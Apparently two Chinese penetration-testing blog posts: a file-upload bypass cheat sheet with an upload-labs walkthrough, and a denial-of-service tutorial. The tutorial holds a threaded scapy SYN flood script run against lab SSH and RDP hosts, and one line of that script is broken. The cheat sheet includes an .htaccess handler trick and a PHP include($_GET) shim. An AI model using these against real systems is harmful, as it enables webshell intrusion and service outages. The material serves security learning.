<pre><code>AddType   application/x-httpd-php     .jpg</code></pre><p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p>
<p><strong>7.00截断绕过</strong></p>
<p>php.   jpg  将空格二进制20改为00；</p>
<p><strong>8.win系统解析漏洞绕过</strong></p>
<p>1.上传1.php(或者图片马)，抓包修改为1.php.</p>
<p>2.上传1.php(或者图片马)，抓包修改为1.php::$DATA</p>
<p>3.上传1.php(或者图片马)，抓包修改为1.php:1.jpg</p>
<p>4.上传1.php(或者图片马)，抓包修改为1.php::$DATA…….</p>
<p><strong>9.文件包含绕过</strong>：首先上传图片木马shell.jpg，然后上传可以进行文件包含的php文件,比如上传1.php</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>然后我们访问1.php?x=shell.jpg即可。</p>
<p><strong>10.条件竞争绕过</strong></p>
<p>通过BURP不断发包，导致不断写入webshell,再写入速度频率上超过安全软件查杀频率，导致绕过。</p>
<p><strong>11.二次渲染绕过</strong></p>
<p>上传图片加载后，会对图片进行二次渲养，改变大部分图片源码，绕过为：对照上传后的图片与原图片放在winhex中对不，查看图片哪个数据块没有被改变。将木马代码放在没有改变的一块中，在不损坏图片的前提下，即可绕过上传</p>
<p><strong>12.中间件解析漏洞</strong></p>
<p>apache：上传图片马，抓包修改为1.php.xxxx.abc</p>
<p>iis6.0 6.5：上传图片马，抓包修改猴嘴为.asa、.cer和.cdx等。</p>
<p>​                    上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以</p>
<p>​                    上传图片马，抓包发现有保存图片的路径，如../upload/image</p>
<p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p>
<p>​            upload/image/1.jpg/.php</p>
<p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p>
<h3 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h3><p><strong>upolad-labs考察知识点汇总：</strong></p>
<img src="11525934-e19630249b9b8764.png"  />



<p>​    upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
<h5 id="Pass-01-前端js检测"><a href="#Pass-01-前端js检测" class="headerlink" title="Pass-01-前端js检测"></a>Pass-01-前端js检测</h5><p><strong>考察知识点：</strong>前端js检测，我们可以选择禁用js,或者直接burp直接抓包绕过.。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201219.png" alt=""></p>
<h5 id="Pass-02-只检测Content-type"><a href="#Pass-02-只检测Content-type" class="headerlink" title="Pass-02 只检测Content-type"></a>Pass-02 只检测Content-type</h5><p><strong>考察知识点：</strong>Content-Type绕过，我们直接改为 image/jpeg</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201548.png" alt=""></p>
<h5 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h5><p><strong>考察知识点：</strong>黑名单绕过，禁止上传.asp|.aspx|.php|.jsp后缀文件，但是我们可以上传.php3 .phtml .php5另类后缀名。</p>
<h5 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04  .htaccess绕过"></a>Pass-04  .htaccess绕过</h5><p><strong>考察知识点：</strong>构造.htaccess文件，内容为<code>AddType  application/x-httpd-php  .jpg</code></p>
<p>我们首先上传.htaccess文件，</p>
<img src="QQ截图20200124121848.png" style="zoom: 80%;" />



<p>然后上传我们事先准备好的php文件将后缀改为.jpg文件,</p>
<img src="QQ截图20200124122245.png" style="zoom:150%;" />

<p>可以在本地看到成功上传。</p>
<h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h5><p><strong>考察知识点：</strong>因为此次黑名单过滤了.htaccess，但是没有将文件名转换为小写。所以我们可以通过大小写绕过。</p>
<img src="QQ截图20200124124135.png" style="zoom: 80%;" />



<h5 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h5><p><strong>考察知识点</strong>：修改文件后缀为<code>1.php空格</code>.,利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格,达到上传.php的目的</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200124124135.png" alt=""></p>
<h5 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h5><p><strong>考察知识点：</strong>wIndow命名规则:window下 xx.php空格xx.php.不允许存在，系统会默认去除空格或点。此处过滤了空格，但是没有过滤点。我们用burp将文件后缀改为php.即可。</p>
<img src="QQ截图20200124130943.png" style="zoom:150%;" />



<h5 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08  ::$DATA绕过"></a>Pass-08  ::$DATA绕过</h5><p><strong>考察知识点</strong>：$DATA绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
<p>所以：文件后缀改为：<code>xx.php::$DATA</code>即可</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115202909.png" alt=""></p>
<h5 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h5><p>这里我们分析一下源代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>这里其实已经过滤的很严格了。</p>
<p>依次进行了严格的黑名单过滤、转换大小写、去除文件名尾的空格和点。还去除了;$DATA.</p>
<p>但是这里存在很明显的代码逻辑漏洞：代码<strong>去点，除空</strong>的操作只进行了一次。那么我们把后缀名改为</p>
<p><strong>php. .</strong> 点 空格点的格式。最后的后缀名为<strong>.php.</strong> 成功绕过。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115204443.png" alt=""></p>
<h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h5><p>考察知识点:双写绕过，这里利用了<code>str_irepalce</code>函数将不符合上传的后缀名替换为空，且该函数对 大小写不敏感，我们可以通过双写后缀名 .pphphp进行绕过。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115205208.png" alt=""></p>
<h5 id="Pass-11-get-00截断"><a href="#Pass-11-get-00截断" class="headerlink" title="Pass-11 get 00截断"></a>Pass-11 get 00截断</h5><p>考察知识点：00截断</p>
<img src="QQ截图20200124131542.png" style="zoom:50%;" />

<p><strong>Pass-12 Post 00截断</strong></p>
<p>考察知识点：00截断</p>
<p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128202954.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128203026.png" alt=""></p>
<h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt=""></p>
<h5 id="拓展资料"><a href="#拓展资料" class="headerlink" title="拓展资料"></a>拓展资料</h5><ul>
<li><a href="http://thief.one/2016/09/21/服务器解析漏洞/" target="_blank" rel="noopener">http://thief.one/2016/09/21/服务器解析漏洞/</a></li>
</ul>
<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><ul>
<li><a href="http://www.y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/" target="_blank" rel="noopener">文件上传漏洞解析及绕过姿势</a></li>
<li><a href="http://www.cnblogs.com/stevenwuzheng/p/5354236.html" target="_blank" rel="noopener">http://www.cnblogs.com/stevenwuzheng/p/5354236.html</a></li>
<li><a href="https://blog.csdn.net/weiwangchao_/article/details/46686505" target="_blank" rel="noopener">https://blog.csdn.net/weiwangchao_/article/details/46686505</a></li>
<li><a href="http://www.myh0st.cn/index.php/archives/7/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/7/</a></li>
<li><a href="http://rdc.hundsun.com/portal/article/627.html" target="_blank" rel="noopener">http://rdc.hundsun.com/portal/article/627.html</a></li>
<li><a href="http://jdrops.dropsec.xyz/2017/07/17/文件上传漏洞总结/" target="_blank" rel="noopener">文件上传漏洞总结</a></li>
<li><a href="https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/" target="_blank" rel="noopener">文件上传漏洞（绕过姿势）</a></li>
<li><a href="http://wyb0.com/posts/file-upload-editor-upload-vulnerability/" target="_blank" rel="noopener">http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</a></li>
</ul>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试——拒绝服务</title>
    <url>/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/</url>
    <content><![CDATA[<h2 id="拒绝服务常见的攻击方式总结"><a href="#拒绝服务常见的攻击方式总结" class="headerlink" title="拒绝服务常见的攻击方式总结"></a>拒绝服务常见的攻击方式总结</h2><h4 id="1-拒绝服务简介"><a href="#1-拒绝服务简介" class="headerlink" title="1.拒绝服务简介"></a>1.拒绝服务简介</h4><ul>
<li>Dos不是Ddos<ul>
<li>利用程序漏洞或一对一资源耗尽的Denial of service拒绝服务</li>
</ul>
</li>
<li>DDos分布式拒绝服务<ul>
<li>一对一的攻击完全拼各自的资源，效果差。</li>
<li>多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</li>
</ul>
</li>
<li>历史<ul>
<li>以前：欠缺技术能力的无赖，我ping死你</li>
<li>现在：最强大最危险的攻击，攻击方式众多<ul>
<li>贩卖和租用肉鸡已经成为黑产种重要的一部分</li>
<li>最终的办法就是拼资源，投资抗D，或者乖乖交保护费。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-DoS分类"><a href="#2-DoS分类" class="headerlink" title="2.DoS分类"></a>2.DoS分类</h4><ul>
<li>D网络<ul>
<li>基于巨量的Flood耗尽目标网络带宽资源</li>
<li>ICMP Flood、UDP Flood</li>
</ul>
</li>
<li>D协议<ul>
<li>攻击协议漏洞发起的拒绝服务攻击</li>
<li>如Syn Flood、Ping of Death、ARP、DNS、802.11、SSL </li>
</ul>
</li>
<li>D应用<ul>
<li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li>
<li>大量频繁访问消耗系统资源严重的应用（CC）</li>
<li>通常表现为操作系统运行正常，网络流量不大，但服务停止响应</li>
<li>可以是一击毙命的，也可以是耗尽目标资源的</li>
</ul>
</li>
</ul>
<h4 id="3-为何会被Dos"><a href="#3-为何会被Dos" class="headerlink" title="3.为何会被Dos"></a>3.为何会被Dos</h4><ul>
<li>从攻击者到被害者<ul>
<li>网络—&gt;FW（服务）—&gt;服务器OS—&gt;服务应用</li>
</ul>
</li>
<li>资源耗尽<ul>
<li>网络：带宽</li>
<li>FW:吞吐量、并发连接</li>
<li>服务器：CPU、内存、I/O</li>
<li>应用：处理请求能力，对OS资源的使用权</li>
</ul>
</li>
<li>程序漏洞攻击<ul>
<li>缓冲区溢出</li>
<li>协议、程序逻辑漏洞</li>
</ul>
</li>
<li>链路上任何一点都可成为目标</li>
</ul>
<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200320111906.png" alt=""></p>
<h3 id="拒绝服务——Syn-Flood攻击"><a href="#拒绝服务——Syn-Flood攻击" class="headerlink" title="拒绝服务——Syn-Flood攻击"></a>拒绝服务——Syn-Flood攻击</h3><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>1.TCP连接和端口过程</p>
<p><strong>TCP建立连接</strong></p>
<p>第一次握手：建立连接时，客户端发送syn包（syn=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。</p>
<p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p>
<p>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。</p>
<p>完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的概念：</p>
<p>未连接队列<br>在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于SYN_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。<br><strong>关闭TCP连接</strong></p>
<p>对于一个已经建立的连接，TCP使用改进的三次握手来释放连接（使用一个带有FIN附加标记的报文段）。TCP关闭连接的步骤如下：</p>
<p>第一步，当主机A的应用程序通知TCP数据已经发送完毕时，TCP向主机B发送一个带有FIN附加标记的报文段（FIN表示英文finish）。</p>
<p>第二步，主机B收到这个FIN报文段之后，并不立即用FIN报文段回复主机A，而是先向主机A发送一个确认序号ACK，同时通知自己相应的应用程序：对方要求关闭连接（先发送ACK的目的是为了防止在这段时间内，对方重传FIN报文段）。</p>
<p>第三步，主机B的应用程序告诉TCP：我要彻底的关闭连接，TCP向主机A送一个FIN报文段。</p>
<p>第四步，主机A收到这个FIN报文段后，向主机B发送一个ACK表示连接彻底释放。</p>
<p>2.TCP 连接状态</p>
<p><img src="SW5S4jW.png" alt="img"></p>
<p>3.两个序号和三个标志位：</p>
<ul>
<li>序号：seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。</li>
<li>确认序号：ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，ack=seq+1。</li>
<li>标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等，具体含义如下：<ul>
<li>URG：紧急指针（urgent pointer）有效。</li>
<li>ACK：确认序号有效。</li>
<li>PSH：接收方应该尽快将这个报文交给应用层。</li>
<li>RST：重置连接。</li>
<li>SYN：发起一个新连接。</li>
<li>FIN：释放一个连接。</li>
</ul>
</li>
<li>需要注意的是：<ul>
<li>不要将确认序号ack与标志位中的ACK搞混了。</li>
<li>认方ack=发起方req+1，两端配对</li>
</ul>
</li>
</ul>
<p><img src="qoYhkJa.png" alt="img"><br>在第一次消息发送中，A随机选取一个序列号作为自己的初始序号发送给B；第二次消息B使用ack对A的数据包进行确认，</p>
<p>因为已经收到了序列号为x的数据包，准备接收序列号为x+1的包，所以ack=x+1，同时B告诉A自己的初始序列号，就是seq=y；</p>
<p>第三条消息A告诉B收到了B的确认消息并准备建立连接，A自己此条消息的序列号是x+1，所以seq=x+1，而ack=y+1是表示A正准备接收B序列号为y+1的数据包。</p>
<p><strong>4.四次挥手</strong></p>
<ul>
<li>由于TCP连接时全双工的，因此，每个方向都必须要单独进行关闭，这一原则是当一方完成数据发送任务后，发送一个FIN来终止这一方向的连接，</li>
<li>收到一个FIN只是意味着这一方向上没有数据流动了，即不会再收到数据了，但是在这个TCP连接上仍然能够发送数据，直到这一方向也发送了FIN</li>
<li>首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭，上图描述的即是如此。<ul>
<li>第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态</li>
<li>第二次挥手：Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。</li>
<li>第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。</li>
<li>第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。</li>
</ul>
</li>
</ul>
<h4 id="1-scapy构造数据包"><a href="#1-scapy构造数据包" class="headerlink" title="1.scapy构造数据包"></a>1.scapy构造数据包</h4><h5 id="1-构造-IP-数据包"><a href="#1-构造-IP-数据包" class="headerlink" title="1. 构造 IP 数据包"></a><strong>1. 构造 IP 数据包</strong></h5><pre><code>&gt;&gt;&gt; i=IP()
&gt;&gt;&gt; i.display()</code></pre><p><img src="E3mSTtG.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; i.dst=&quot;10.10.10.132&quot;
&gt;&gt;&gt; i.display()</code></pre><p><img src="KO66HGs.png" alt="img"></p>
<h5 id="2-构造TCP数据包"><a href="#2-构造TCP数据包" class="headerlink" title="2.构造TCP数据包"></a>2.构造TCP数据包</h5><pre><code>&gt;&gt;&gt; t=TCP()
&gt;&gt;&gt; t.display()</code></pre><p><img src="DCJyqt6.png" alt="img"></p>
<pre><code>&gt;&gt;&gt; t.dport=22
&gt;&gt;&gt; t.display()</code></pre><p><img src="y3zVkjb.png" alt="img"></p>
<h5 id="3-发送数据包需要构造成-IP-TCP-形式：i-t"><a href="#3-发送数据包需要构造成-IP-TCP-形式：i-t" class="headerlink" title="3. 发送数据包需要构造成 IP()/TCP() 形式：i/t"></a><strong>3. 发送数据包需要构造成 IP()/TCP() 形式：i/t</strong></h5><pre><code>&gt;&gt;&gt; sr1(i/t,verbose=1,timeout=2)</code></pre><p><img src="WNZ7i9P.png" alt="img"></p>
<h5 id="4-由于重建连接请求时会向服务器发送-reset-数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则："><a href="#4-由于重建连接请求时会向服务器发送-reset-数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则：" class="headerlink" title="4.由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则："></a><strong>4.由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则：</strong></h5><pre><code>iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.132 -j DROP

iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.141 -j DROP</code></pre><h3 id="2-脚本攻击"><a href="#2-脚本攻击" class="headerlink" title="2. 脚本攻击"></a>2. 脚本攻击</h3><h4 id="脚本攻击-linux-服务器"><a href="#脚本攻击-linux-服务器" class="headerlink" title="脚本攻击 linux 服务器"></a>脚本攻击 linux 服务器</h4><p>1.脚本内容</p>
<pre><code>#!/usr/bin/python
#coding=utf-8

from scapy.all import*
from time import sleep
import thread
import random
import logging

logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)

if len(sys.argv) != 4:
    print &quot;用法: ./syn_flood.py [IP地址] [端口] [线程数]&quot;
    print &quot;举例: ../syn_flood.py  1.1.1.1 80 20&quot;
    sys.exit()

target = str(sys.argv[1])
port= int(sys.argv[2])
threads = int(sys.argv[3])

print&quot;正在执行 SYN flood 攻击，按 Ctrl+C 停止攻击。&quot;
def synflood(target,port):
    while 1:
        x = random.randint(0,65535)
        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)
        sr1(i/t,verbose=1,timeout=2)

for x in range(0,threads):
    thread.start_new_thread(synflood,(target,port))

while 1:
  sleep(1)
</code></pre><p>2.执行脚本</p>
<pre><code>root@kali:~# python syn_flood.py 10.10.10.141 22 200
# 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则
iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.132 -j DROP</code></pre><p>抓包发现网络上充满数据包</p>
<p><img src="8QfyVAU.png" alt="img"></p>
<p>使用 ssh 连接 服务器发现无法响应</p>
<p><img src="8EWXAt7.png" alt="img"></p>
<p>在服务器使用 top 查看内存占用情况，发现占用极少</p>
<p><img src="wxcaUbA.png" alt="img"></p>
<p>在服务器查看连接，发现连接数非常多</p>
<p><img src="sHDzLpP.png" alt="img"></p>
<pre><code>查看 linux 服务器最大 TCP 连接数发现是 255 个
netstat -n | awk &#39;/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}&#39;</code></pre><h5 id="2-攻击windows机器"><a href="#2-攻击windows机器" class="headerlink" title="2.攻击windows机器"></a>2.攻击windows机器</h5><p>1.测试可用性</p>
<pre><code>root@kali:~# rdesktop 10.10.10.141</code></pre><p><img src="wYUMp3w.png" alt="img"></p>
<p>2.执行脚本</p>
<pre><code>root@kali:~# python syn_flood.py 10.10.10.141 3389 10
# 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则
iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.141 -j DROP

root@kali:~# rdesktop 10.10.10.141
</code></pre><p><img src="uH5y56U.png" alt="img"></p>
<p>winxp 的最大半开连接数只有 10 个</p>
<h4 id="泛洪攻击常伴随IP地址欺骗"><a href="#泛洪攻击常伴随IP地址欺骗" class="headerlink" title="泛洪攻击常伴随IP地址欺骗"></a>泛洪攻击常伴随IP地址欺骗</h4><p><img src="OIWj7fT.jpg" alt="img"></p>
<p>伪造源地址为 3.3.3.3，访问许多网站，将响应数据包发送给 3.3.3.3</p>
<ul>
<li>经常用于 DoS 攻击</li>
<li>根据 IP 头地址寻址<ul>
<li>伪造IP源地址</li>
</ul>
</li>
<li>便捷路由器过滤源IP<ul>
<li>入站、出站</li>
</ul>
</li>
<li>受害者可能是源、目的地址</li>
<li>绕过基于地址的验证</li>
<li>压力测试模拟多用户</li>
<li>上层协议（TCP序列号）</li>
</ul>
